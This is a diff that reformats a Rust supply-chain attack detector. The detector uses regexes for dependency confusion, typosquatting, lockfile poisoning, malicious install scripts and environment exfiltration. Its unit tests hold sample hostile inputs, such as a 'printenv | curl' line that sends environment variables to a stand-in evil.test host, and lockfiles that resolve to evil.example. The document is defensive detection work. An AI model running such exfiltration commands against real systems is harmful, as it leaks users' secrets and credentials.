@@ -7,8 +7,12 @@ use regex::Regex;
 pub struct SupplyChainEvaluator;
 
 impl L2Evaluator for SupplyChainEvaluator {
-    fn id(&self) -> &'static str { "supply_chain" }
-    fn prefix(&self) -> &'static str { "L2 SupplyChain" }
+    fn id(&self) -> &'static str {
+        "supply_chain"
+    }
+    fn prefix(&self) -> &'static str {
+        "L2 SupplyChain"
+    }
 
     #[inline]
 
@@ -17,9 +21,13 @@ impl L2Evaluator for SupplyChainEvaluator {
         let decoded = crate::encoding::multi_layer_decode(input).fully_decoded;
 
         // Dependency confusion: scoped package with internal-looking name
-        static dep_confusion: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?i)(?:@[a-z][\w-]*/)?(?:internal|private|corp|company)[\w-]*").unwrap());
-        static INSTALL_CONTEXT_RE: std::sync::LazyLock<Regex> =
-            std::sync::LazyLock::new(|| Regex::new(r"(?i)(?:npm\s+install|pip\s+install|gem\s+install|require|import|from\s)").unwrap());
+        static dep_confusion: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)(?:@[a-z][\w-]*/)?(?:internal|private|corp|company)[\w-]*").unwrap()
+        });
+        static INSTALL_CONTEXT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)(?:npm\s+install|pip\s+install|gem\s+install|require|import|from\s)")
+                .unwrap()
+        });
         if let Some(m) = dep_confusion.find(&decoded) {
             if INSTALL_CONTEXT_RE.is_match(&decoded) {
                 dets.push(L2Detection {
@@ -30,16 +38,23 @@ impl L2Evaluator for SupplyChainEvaluator {
                     evidence: vec![ProofEvidence {
                         operation: EvidenceOperation::PayloadInject,
                         matched_input: m.as_str().to_owned(),
-                        interpretation: "Package name resembles internal package — dependency confusion attack".into(),
+                        interpretation:
+                            "Package name resembles internal package — dependency confusion attack"
+                                .into(),
                         offset: m.start(),
-                        property: "Package installations must verify package source and scope".into(),
+                        property: "Package installations must verify package source and scope"
+                            .into(),
                     }],
                 });
             }
         }
 
         // Dependency confusion against public registries
-        static public_registry_confusion: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?i)(?:npm\s+install|pip\s+install)[^\n\r]{0,120}(?:internal|private|corp|company)[\w@/\.-]*[^\n\r]{0,120}(?:registry\.npmjs\.org|pypi\.org|--index-url\s+https?://pypi\.org|--registry\s+https?://registry\.npmjs\.org)").unwrap());
+        static public_registry_confusion: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(
+            || {
+                Regex::new(r"(?i)(?:npm\s+install|pip\s+install)[^\n\r]{0,120}(?:internal|private|corp|company)[\w@/\.-]*[^\n\r]{0,120}(?:registry\.npmjs\.org|pypi\.org|--index-url\s+https?://pypi\.org|--registry\s+https?://registry\.npmjs\.org)").unwrap()
+            },
+        );
         if let Some(m) = public_registry_confusion.find(&decoded) {
             dets.push(L2Detection {
                 detection_type: "dependency_confusion".into(),
@@ -49,17 +64,23 @@ impl L2Evaluator for SupplyChainEvaluator {
                 evidence: vec![ProofEvidence {
                     operation: EvidenceOperation::PayloadInject,
                     matched_input: m.as_str().to_owned(),
-                    interpretation: "Install command mixes private package naming with public registry source".into(),
+                    interpretation:
+                        "Install command mixes private package naming with public registry source"
+                            .into(),
                     offset: m.start(),
-                    property: "Private package names must resolve only from trusted internal registries".into(),
+                    property:
+                        "Private package names must resolve only from trusted internal registries"
+                            .into(),
                 }],
             });
         }
 
         // Dependency confusion via direct public registry URL paths with internal-looking package names
-        static PUBLIC_REGISTRY_URL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-            Regex::new(r#"(?i)https?://(?P<host>registry\.npmjs\.org|pypi\.org)/(?:simple/)?(?P<pkg>@?[a-z0-9][a-z0-9._/-]{1,120})"#).unwrap()
-        });
+        static PUBLIC_REGISTRY_URL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(
+            || {
+                Regex::new(r#"(?i)https?://(?P<host>registry\.npmjs\.org|pypi\.org)/(?:simple/)?(?P<pkg>@?[a-z0-9][a-z0-9._/-]{1,120})"#).unwrap()
+            },
+        );
         for caps in PUBLIC_REGISTRY_URL_RE.captures_iter(&decoded) {
             let host = caps.name("host").map(|m| m.as_str()).unwrap_or_default();
             let pkg = caps.name("pkg").map(|m| m.as_str()).unwrap_or_default();
@@ -104,9 +125,13 @@ impl L2Evaluator for SupplyChainEvaluator {
                         evidence: vec![ProofEvidence {
                             operation: EvidenceOperation::PayloadInject,
                             matched_input: m.as_str().to_owned(),
-                            interpretation: format!("Package name is a typosquat variant of '{}'", target),
+                            interpretation: format!(
+                                "Package name is a typosquat variant of '{}'",
+                                target
+                            ),
                             offset: m.start(),
-                            property: "Package names must be verified against known-good packages".into(),
+                            property: "Package names must be verified against known-good packages"
+                                .into(),
                         }],
                     });
                 }
@@ -133,8 +158,9 @@ impl L2Evaluator for SupplyChainEvaluator {
         }
 
         // Malicious install scripts
-        static INSTALL_SCRIPT_RE: std::sync::LazyLock<Regex> =
-            std::sync::LazyLock::new(|| Regex::new(r#"(?i)"(?:preinstall|postinstall|install)"\s*:\s*"[^"]*(?:curl|wget|bash|sh|node\s+-e|python\s+-c)"#).unwrap());
+        static INSTALL_SCRIPT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r#"(?i)"(?:preinstall|postinstall|install)"\s*:\s*"[^"]*(?:curl|wget|bash|sh|node\s+-e|python\s+-c)"#).unwrap()
+        });
         let install_script = &*INSTALL_SCRIPT_RE;
         if let Some(m) = install_script.find(&decoded) {
             dets.push(L2Detection {
@@ -145,7 +171,8 @@ impl L2Evaluator for SupplyChainEvaluator {
                 evidence: vec![ProofEvidence {
                     operation: EvidenceOperation::PayloadInject,
                     matched_input: m.as_str().to_owned(),
-                    interpretation: "Install lifecycle script downloads and executes remote code".into(),
+                    interpretation: "Install lifecycle script downloads and executes remote code"
+                        .into(),
                     offset: m.start(),
                     property: "Package install scripts must not execute remote code".into(),
                 }],
@@ -153,7 +180,9 @@ impl L2Evaluator for SupplyChainEvaluator {
         }
 
         // curl|sh and wget -O -|sh style install-time execution
-        static pipe_exec: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?i)(?:curl\s+[^\n\r|]*\|\s*(?:sh|bash)|wget\s+[^\n\r]*-O\s*-\s*\|\s*(?:sh|bash))").unwrap());
+        static pipe_exec: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)(?:curl\s+[^\n\r|]*\|\s*(?:sh|bash)|wget\s+[^\n\r]*-O\s*-\s*\|\s*(?:sh|bash))").unwrap()
+        });
         if let Some(m) = pipe_exec.find(&decoded) {
             dets.push(L2Detection {
                 detection_type: "malicious_script".into(),
@@ -163,15 +192,20 @@ impl L2Evaluator for SupplyChainEvaluator {
                 evidence: vec![ProofEvidence {
                     operation: EvidenceOperation::SemanticEval,
                     matched_input: m.as_str().to_owned(),
-                    interpretation: "Remote content is executed without integrity verification".into(),
+                    interpretation: "Remote content is executed without integrity verification"
+                        .into(),
                     offset: m.start(),
-                    property: "Build/install workflows must never execute unverified remote scripts".into(),
+                    property:
+                        "Build/install workflows must never execute unverified remote scripts"
+                            .into(),
                 }],
             });
         }
 
         // Explicitly enabling npm scripts in CI/install command lines
-        static npm_script_enable: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r"(?i)npm\s+(?:ci|install)[^\n\r]{0,120}(?:--ignore-scripts(?:=|\s+)false|--scripts(?:=|\s+)true)").unwrap());
+        static npm_script_enable: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)npm\s+(?:ci|install)[^\n\r]{0,120}(?:--ignore-scripts(?:=|\s+)false|--scripts(?:=|\s+)true)").unwrap()
+        });
         if let Some(m) = npm_script_enable.find(&decoded) {
             dets.push(L2Detection {
                 detection_type: "malicious_script".into(),
@@ -228,8 +262,9 @@ impl L2Evaluator for SupplyChainEvaluator {
         }
 
         // package-lock lockfile poisoning signals
-        static LOCKFILE_POISON_RE: std::sync::LazyLock<Regex> =
-            std::sync::LazyLock::new(|| Regex::new(r#"(?is)"integrity"\s*:\s*"(?:sha1|sha512)-(?:0{8,}|[A-Za-z0-9+/=]{0,20})".{0,240}"resolved"\s*:\s*"http://"#).unwrap());
+        static LOCKFILE_POISON_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r#"(?is)"integrity"\s*:\s*"(?:sha1|sha512)-(?:0{8,}|[A-Za-z0-9+/=]{0,20})".{0,240}"resolved"\s*:\s*"http://"#).unwrap()
+        });
         let lockfile_poison = &*LOCKFILE_POISON_RE;
         if let Some(m) = lockfile_poison.find(&decoded) {
             dets.push(L2Detection {
@@ -240,17 +275,21 @@ impl L2Evaluator for SupplyChainEvaluator {
                 evidence: vec![ProofEvidence {
                     operation: EvidenceOperation::SyntaxRepair,
                     matched_input: m.as_str()[..m.as_str().len().min(100)].to_owned(),
-                    interpretation: "Weak or malformed integrity hash paired with insecure resolved URL".into(),
+                    interpretation:
+                        "Weak or malformed integrity hash paired with insecure resolved URL".into(),
                     offset: m.start(),
-                    property: "Lockfiles must enforce strong integrity hashes and secure transport".into(),
+                    property: "Lockfiles must enforce strong integrity hashes and secure transport"
+                        .into(),
                 }],
             });
         }
 
         // Lockfile manipulation: weak integrity strings, URL substitutions, and patch-like tampering hunks
-        static LOCKFILE_INTEGRITY_TAMPER_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-            Regex::new(r#"(?is)(?:^|\n)\s*(?:"?integrity"?\s*[:=]\s*"?(?:sha1-[A-Za-z0-9+/=]{1,40}|sha512-(?:0{8,}|A{8,}|[A-Za-z0-9+/=]{0,18})))"#).unwrap()
-        });
+        static LOCKFILE_INTEGRITY_TAMPER_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(
+            || {
+                Regex::new(r#"(?is)(?:^|\n)\s*(?:"?integrity"?\s*[:=]\s*"?(?:sha1-[A-Za-z0-9+/=]{1,40}|sha512-(?:0{8,}|A{8,}|[A-Za-z0-9+/=]{0,18})))"#).unwrap()
+            },
+        );
         if let Some(m) = LOCKFILE_INTEGRITY_TAMPER_RE.find(&decoded) {
             dets.push(L2Detection {
                 detection_type: "lockfile_poisoning".into(),
@@ -267,9 +306,11 @@ impl L2Evaluator for SupplyChainEvaluator {
             });
         }
 
-        static LOCKFILE_REGISTRY_SUB_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-            Regex::new(r#"(?is)(?:"resolved"\s*:\s*"https?://(?P<host>[a-z0-9.-]+)[^"]*"|resolved\s+"https?://(?P<yarnhost>[a-z0-9.-]+)[^"]*")"#).unwrap()
-        });
+        static LOCKFILE_REGISTRY_SUB_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(
+            || {
+                Regex::new(r#"(?is)(?:"resolved"\s*:\s*"https?://(?P<host>[a-z0-9.-]+)[^"]*"|resolved\s+"https?://(?P<yarnhost>[a-z0-9.-]+)[^"]*")"#).unwrap()
+            },
+        );
         for caps in LOCKFILE_REGISTRY_SUB_RE.captures_iter(&decoded) {
             let host = caps
                 .name("host")
@@ -281,22 +322,30 @@ impl L2Evaluator for SupplyChainEvaluator {
                 dets.push(L2Detection {
                     detection_type: "lockfile_poisoning".into(),
                     confidence: 0.85,
-                    detail: format!("Lockfile resolved URL points to non-standard registry host '{}'", host),
+                    detail: format!(
+                        "Lockfile resolved URL points to non-standard registry host '{}'",
+                        host
+                    ),
                     position: m.start(),
                     evidence: vec![ProofEvidence {
                         operation: EvidenceOperation::PayloadInject,
                         matched_input: m.as_str().to_owned(),
-                        interpretation: "Package resolution endpoint differs from trusted registry domains".into(),
+                        interpretation:
+                            "Package resolution endpoint differs from trusted registry domains"
+                                .into(),
                         offset: m.start(),
-                        property: "Lockfiles must not redirect package fetches to untrusted registries".into(),
+                        property:
+                            "Lockfiles must not redirect package fetches to untrusted registries"
+                                .into(),
                     }],
                 });
             }
         }
 
-        static LOCKFILE_DIFF_TAMPER_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-            Regex::new(r#"(?im)^[+-]\s*"?(?:integrity|resolved)"?\s*[:=].*$"#).unwrap()
-        });
+        static LOCKFILE_DIFF_TAMPER_RE: std::sync::LazyLock<Regex> =
+            std::sync::LazyLock::new(|| {
+                Regex::new(r#"(?im)^[+-]\s*"?(?:integrity|resolved)"?\s*[:=].*$"#).unwrap()
+            });
         if let Some(m) = LOCKFILE_DIFF_TAMPER_RE.find(&decoded) {
             dets.push(L2Detection {
                 detection_type: "lockfile_poisoning".into(),
@@ -306,9 +355,11 @@ impl L2Evaluator for SupplyChainEvaluator {
                 evidence: vec![ProofEvidence {
                     operation: EvidenceOperation::SyntaxRepair,
                     matched_input: m.as_str().trim().to_owned(),
-                    interpretation: "Patch context modifies lockfile trust anchors (integrity/resolved)".into(),
+                    interpretation:
+                        "Patch context modifies lockfile trust anchors (integrity/resolved)".into(),
                     offset: m.start(),
-                    property: "Lockfile trust fields require strict review and origin validation".into(),
+                    property: "Lockfile trust fields require strict review and origin validation"
+                        .into(),
                 }],
             });
         }
@@ -372,7 +423,10 @@ impl L2Evaluator for SupplyChainEvaluator {
             Regex::new(r#"(?is)"name"\s*:\s*"(?P<manifest>@?[a-z0-9][a-z0-9._/-]{1,120})".{0,700}?"node_modules/(?P<actual>@?[a-z0-9][a-z0-9._/-]{1,120})""#).unwrap()
         });
         for caps in MANIFEST_NAME_RE.captures_iter(&decoded) {
-            let manifest = caps.name("manifest").map(|m| m.as_str()).unwrap_or_default();
+            let manifest = caps
+                .name("manifest")
+                .map(|m| m.as_str())
+                .unwrap_or_default();
             let actual = caps.name("actual").map(|m| m.as_str()).unwrap_or_default();
             if normalize_package_name(manifest) != normalize_package_name(actual) {
                 let m = caps.get(0).expect("full capture exists");
@@ -393,8 +447,9 @@ impl L2Evaluator for SupplyChainEvaluator {
         }
 
         // .gitmodules poisoning: suspicious external/insecure submodule URLs
-        static GITMODULES_URL_RE: std::sync::LazyLock<Regex> =
-            std::sync::LazyLock::new(|| Regex::new(r#"(?is)\[submodule\s+"[^"]+"\].{0,260}?url\s*=\s*(?:git://|http://|https?://(?:\d{1,3}(?:\.\d{1,3}){3}|localhost|127\.0\.0\.1|raw\.githubusercontent\.com))"#).unwrap());
+        static GITMODULES_URL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r#"(?is)\[submodule\s+"[^"]+"\].{0,260}?url\s*=\s*(?:git://|http://|https?://(?:\d{1,3}(?:\.\d{1,3}){3}|localhost|127\.0\.0\.1|raw\.githubusercontent\.com))"#).unwrap()
+        });
         let gitmodules_url = &*GITMODULES_URL_RE;
         if let Some(m) = gitmodules_url.find(&decoded) {
             dets.push(L2Detection {
@@ -413,19 +468,26 @@ impl L2Evaluator for SupplyChainEvaluator {
         }
 
         // Environment exfiltration from install/lifecycle context
-        static env_exfil: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| Regex::new(r#"(?is)(?:preinstall|postinstall|install|npm\s+(?:ci|install)|pip\s+install).{0,220}?(?:process\.env|printenv|env|\$[A-Z_]{2,}|/proc/self/environ).{0,220}?(?:curl|wget|nc|powershell|Invoke-WebRequest|fetch|axios|requests\.)"#).unwrap());
+        static env_exfil: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r#"(?is)(?:preinstall|postinstall|install|npm\s+(?:ci|install)|pip\s+install).{0,220}?(?:process\.env|printenv|env|\$[A-Z_]{2,}|/proc/self/environ).{0,220}?(?:curl|wget|nc|powershell|Invoke-WebRequest|fetch|axios|requests\.)"#).unwrap()
+        });
         if let Some(m) = env_exfil.find(&decoded) {
             dets.push(L2Detection {
                 detection_type: "env_exfiltration".into(),
                 confidence: 0.91,
-                detail: "Potential environment secret exfiltration in dependency/install flow".into(),
+                detail: "Potential environment secret exfiltration in dependency/install flow"
+                    .into(),
                 position: m.start(),
                 evidence: vec![ProofEvidence {
                     operation: EvidenceOperation::SemanticEval,
                     matched_input: m.as_str()[..m.as_str().len().min(120)].to_owned(),
-                    interpretation: "Install-time script reads environment data and transmits it externally".into(),
+                    interpretation:
+                        "Install-time script reads environment data and transmits it externally"
+                            .into(),
                     offset: m.start(),
-                    property: "Build scripts must not exfiltrate environment variables or local secrets".into(),
+                    property:
+                        "Build scripts must not exfiltrate environment variables or local secrets"
+                            .into(),
                 }],
             });
         }
@@ -435,7 +497,10 @@ impl L2Evaluator for SupplyChainEvaluator {
 
     fn map_class(&self, detection_type: &str) -> Option<InvariantClass> {
         match detection_type {
-            "dependency_confusion" | "typosquatting" | "lockfile_poisoning" | "gitmodules_poisoning" => Some(InvariantClass::DependencyConfusion),
+            "dependency_confusion"
+            | "typosquatting"
+            | "lockfile_poisoning"
+            | "gitmodules_poisoning" => Some(InvariantClass::DependencyConfusion),
             "malicious_script" => Some(InvariantClass::PostinstallInjection),
             "env_exfiltration" => Some(InvariantClass::EnvExfiltration),
             "cdn_integrity_bypass" => Some(InvariantClass::PostinstallInjection),
@@ -474,13 +539,7 @@ fn normalize_scoped_package_name(trimmed: &str) -> Option<String> {
 fn is_internal_looking_package(pkg: &str) -> bool {
     let canonical = normalize_package_name(pkg);
     let tags = [
-        "internal",
-        "private",
-        "corp",
-        "company",
-        "intranet",
-        "platform",
-        "svc",
+        "internal", "private", "corp", "company", "intranet", "platform", "svc",
     ];
     tags.iter().any(|t| canonical.contains(t))
 }
@@ -500,7 +559,8 @@ fn is_trusted_lockfile_host(host: &str) -> bool {
 
 fn extract_dependency_candidates(decoded: &str) -> Vec<(String, usize)> {
     static INSTALL_NAME_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-        Regex::new(r#"(?i)(?:npm\s+install|pnpm\s+add|yarn\s+add|pip\s+install)\s+([@\w\./-]+)"#).unwrap()
+        Regex::new(r#"(?i)(?:npm\s+install|pnpm\s+add|yarn\s+add|pip\s+install)\s+([@\w\./-]+)"#)
+            .unwrap()
     });
     static MANIFEST_DEP_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
         Regex::new(r#"(?i)"([@a-z0-9][@a-z0-9._/-]{1,120})"\s*:\s*"[^"]+""#).unwrap()
@@ -565,14 +625,7 @@ fn typosquat_target_for(pkg: &str) -> Option<&'static str> {
     let canonical = normalize_package_name(pkg);
     let folded = leetspeak_fold(&canonical);
     let targets = [
-        "lodash",
-        "react",
-        "requests",
-        "django",
-        "express",
-        "axios",
-        "numpy",
-        "pandas",
+        "lodash", "react", "requests", "django", "express", "axios", "numpy", "pandas",
     ];
     for target in targets {
         if canonical == target {
@@ -623,8 +676,12 @@ mod tests {
     #[test]
     fn detects_public_registry_dependency_confusion() {
         let eval = SupplyChainEvaluator;
-        let dets = eval.detect("npm install @corp-internal/core --registry https://registry.npmjs.org");
-        assert!(dets.iter().any(|d| d.detection_type == "dependency_confusion"));
+        let dets =
+            eval.detect("npm install @corp-internal/core --registry https://registry.npmjs.org");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "dependency_confusion")
+        );
     }
 
     #[test]
@@ -637,30 +694,46 @@ mod tests {
     #[test]
     fn detects_lockfile_poisoning_pattern() {
         let eval = SupplyChainEvaluator;
-        let dets = eval.detect(r#"{"integrity":"sha512-0000000000","resolved":"http://evil.example/pkg.tgz"}"#);
-        assert!(dets.iter().any(|d| d.detection_type == "lockfile_poisoning"));
+        let dets = eval.detect(
+            r#"{"integrity":"sha512-0000000000","resolved":"http://evil.example/pkg.tgz"}"#,
+        );
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "lockfile_poisoning")
+        );
     }
 
     #[test]
     fn detects_env_exfiltration_in_install_script() {
         let eval = SupplyChainEvaluator;
-        let dets = eval.detect(r#"npm install foo && printenv | curl -d @- https://evil.test/collect"#);
+        let dets =
+            eval.detect(r#"npm install foo && printenv | curl -d @- https://evil.test/collect"#);
         assert!(dets.iter().any(|d| d.detection_type == "env_exfiltration"));
-        assert_eq!(eval.map_class("env_exfiltration"), Some(InvariantClass::EnvExfiltration));
+        assert_eq!(
+            eval.map_class("env_exfiltration"),
+            Some(InvariantClass::EnvExfiltration)
+        );
     }
 
     #[test]
     fn detects_internal_package_name_in_npm_public_registry_url() {
         let eval = SupplyChainEvaluator;
         let dets = eval.detect("GET https://registry.npmjs.org/@company-internal/sdk");
-        assert!(dets.iter().any(|d| d.detection_type == "dependency_confusion"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "dependency_confusion")
+        );
     }
 
     #[test]
     fn detects_internal_package_name_in_pypi_public_registry_url() {
         let eval = SupplyChainEvaluator;
-        let dets = eval.detect("pip install --index-url https://pypi.org/simple/ internal-private-utils");
-        assert!(dets.iter().any(|d| d.detection_type == "dependency_confusion"));
+        let dets =
+            eval.detect("pip install --index-url https://pypi.org/simple/ internal-private-utils");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "dependency_confusion")
+        );
     }
 
     #[test]
@@ -688,22 +761,37 @@ mod tests {
     fn detects_lockfile_registry_url_substitution() {
         let eval = SupplyChainEvaluator;
         let dets = eval.detect(r#"{"resolved":"https://evil-registry.example.com/lodash/-/lodash-4.17.21.tgz","integrity":"sha512-abc"}"#);
-        assert!(dets.iter().any(|d| d.detection_type == "lockfile_poisoning"));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "lockfile_poisoning")
+        );
     }
 
     #[test]
     fn detects_missing_sri_for_third_party_cdn_script() {
         let eval = SupplyChainEvaluator;
         let dets = eval.detect(r#"<script src="https://cdn.jsdelivr.net/npm/react@18/umd/react.production.min.js"></script>"#);
-        assert!(dets.iter().any(|d| d.detection_type == "cdn_integrity_bypass"));
-        assert_eq!(eval.map_class("cdn_integrity_bypass"), Some(InvariantClass::PostinstallInjection));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "cdn_integrity_bypass")
+        );
+        assert_eq!(
+            eval.map_class("cdn_integrity_bypass"),
+            Some(InvariantClass::PostinstallInjection)
+        );
     }
 
     #[test]
     fn detects_manifest_confusion_via_npm_alias() {
         let eval = SupplyChainEvaluator;
         let dets = eval.detect(r#"{"dependencies":{"left-pad":"npm:right-pad@1.0.0"}}"#);
-        assert!(dets.iter().any(|d| d.detection_type == "manifest_confusion"));
-        assert_eq!(eval.map_class("manifest_confusion"), Some(InvariantClass::DependencyConfusion));
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "manifest_confusion")
+        );
+        assert_eq!(
+            eval.map_class("manifest_confusion"),
+            Some(InvariantClass::DependencyConfusion)
+        );
     }
 }
